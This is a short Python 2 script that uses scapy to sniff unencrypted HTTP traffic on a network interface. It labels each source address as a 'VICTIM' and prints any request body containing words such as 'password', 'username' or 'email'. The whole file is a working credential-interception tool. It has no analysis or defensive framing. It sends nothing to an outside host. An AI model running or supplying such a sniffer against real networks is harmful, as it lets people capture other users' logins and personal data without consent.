#!/usr/bin/python2
#_*_ coding: utf8 _*_

from scapy.all import *
from scapy_http import http
from colorama import Fore, init

init()

wordlist = ["email","username","user","usuario","password","passwd"]


def captura_http(packet):
	if packet.haslayer(http.HTTPRequest):
		print("[+] VICTIM: " + packet[IP].src + " DESTINATION IP : " + packet[IP].dst + " DOMINIO: " + packet[http.HTTPRequest].Host)
		if packet.haslayer(Raw):
			load = packet[Raw].load
			load = load.lower()
			for e in wordlist:
				if e in load:
					print(Fore.LIGHTRED_EX + " DATA FOUND: " + load)
def main():
	print("--- [{}+{}] Capturing packets...".format(Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX))
	sniff(iface="eth0", store=False, prn=captura_http)

if __name__ == '__main__':
	main()